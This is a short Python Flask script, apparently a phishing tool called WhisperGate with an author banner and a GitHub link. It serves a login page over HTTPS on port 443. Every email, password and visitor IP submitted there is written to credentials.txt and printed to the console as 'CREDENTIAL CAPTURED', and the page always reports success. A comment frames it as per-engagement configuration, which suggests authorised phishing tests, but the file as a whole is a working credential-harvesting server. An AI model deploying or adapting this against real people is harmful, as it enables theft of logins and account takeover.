from datetime import datetime

def print_ascii_art():
    ascii_art = """

 __        ___     _                       ____       _       
 \\ \\      / / |__ (_)___ _ __   ___ _ __  / ___| __ _| |_ ___ 
  \\ \\ /\\ / /| '_ \\| / __| '_ \\ / _ \\ '__|| |  _ / _` | __/ _ \\
   \\ V  V / | | | | \\__ \\ |_) |  __/ |   | |_| | (_| | ||  __/
    \\_/\\_/  |_| |_|_|___/ .__/ \\___|_|    \\____|\\__,_|\\__\\___|
                        |_|                                    

    """
    author = "Written by: Justin Henderson - whisk3y3"
    github = "https://github.com/whisk3y3/WhisperGate"
    version = "Version 2.0"
    print(ascii_art)
    print(author)
    print(github)
    print(version)
    print()
    print("Happy Hunting!")
    print()

print_ascii_art()

from flask import Flask, render_template, request, jsonify
import ssl

app = Flask(__name__)

# ── Configuration ─────────────────────────────────────
# Update these per engagement:
EMAIL_DOMAIN = '@evilphishinc.com'   # Target org email domain
MIN_PASS_LEN = 1                     # Minimum password length to accept

def log_credentials(email, password, ip):
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    entry = f"[{timestamp}] IP: {ip} | Email: {email} | Password: {password}"
    with open('credentials.txt', 'a') as f:
        f.write(entry + '\n')
    # Also print to console for real-time monitoring
    print(f"\n{'='*60}")
    print(f"  CREDENTIAL CAPTURED")
    print(f"  Time:     {timestamp}")
    print(f"  IP:       {ip}")
    print(f"  Email:    {email}")
    print(f"  Password: {password}")
    print(f"{'='*60}\n")

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/login', methods=['POST'])
def login():
    email = request.form.get('email', '')
    password = request.form.get('password', '')
    ip = request.remote_addr

    if email and len(password) >= MIN_PASS_LEN:
        log_credentials(email, password, ip)
        return jsonify({'status': 'ok'})
    else:
        return jsonify({'status': 'error', 'message': 'Invalid credentials'}), 400

if __name__ == '__main__':
    cert_file = 'fullchain.pem'
    key_file = 'privkey.pem'
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    context.load_cert_chain(cert_file, key_file)

    app.run(host='0.0.0.0', port=443, ssl_context=context)
